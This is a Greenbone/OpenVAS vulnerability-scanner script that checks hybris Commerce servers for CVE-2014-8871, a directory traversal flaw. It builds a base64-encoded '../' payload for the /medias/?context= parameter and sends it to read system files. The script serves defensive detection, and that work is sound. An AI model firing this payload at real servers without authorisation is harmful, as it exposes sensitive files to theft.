if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105955" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-02-25 14:49:12 +0700 (Wed, 25 Feb 2015)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2014-8871" );
	script_bugtraq_id( 72681 );
	script_name( "hybris Commerce Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "hybris Commerce Software Suite is vulnerable to a
  directory traversal attack." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP
  GET request and check whether it is possible to access local files." );
	script_tag( name: "insight", value: "Webshops based on hybris may use a file retrieval
  system where files are identified by a URL parameter named 'context' rather than a file
  name. The context is base64 encoded and consists among other parameters the file name.
  This file name is vulnerable to directory traversal." );
	script_tag( name: "impact", value: "An unauthenticated attacker can retrieve arbitrary files
  which might consist sensitive data which can be used for further attacks." );
	script_tag( name: "affected", value: "hybris Commerce Software Suite Releases 5.0.0, 5.0.3,
  5.0.4, 5.1, 5.1.1, 5.2 and 5.3" );
	script_tag( name: "solution", value: "Upgrade to Release 5.0.0.4, 5.0.3.4, 5.0.4.5, 5.1.0.2,
  5.1.1.3, 5.2.0.4, 5.3.0.2 or higher." );
	script_xref( name: "URL", value: "https://www.redteam-pentesting.de/advisories/rt-sa-2014-016" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	payload_clear = "master|root|12345|text/plain|../../../../../../" + file + "|";
	payload_encoded = base64( str: payload_clear );
	url = "/medias/?context=" + payload_encoded;
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && egrep( string: res, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

